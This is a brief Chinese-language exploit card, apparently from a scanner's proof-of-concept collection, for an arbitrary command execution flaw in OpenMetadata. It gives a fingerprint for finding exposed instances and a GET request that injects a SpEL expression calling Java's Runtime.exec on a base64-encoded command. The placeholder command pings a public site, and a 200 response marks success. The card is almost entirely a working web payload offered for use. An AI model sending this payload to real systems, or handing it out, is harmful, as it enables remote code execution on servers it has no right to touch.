# OpenMetadata任意命令执行漏洞

OpenMetadata ｜ 命令执行 ｜ —
- **指纹**：`title="OpenMetadata"`
- **请求**：`GET /api/v1/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22{{base64enc(ping www.baidu.com)}}%22))) H`
- **响应特征**：200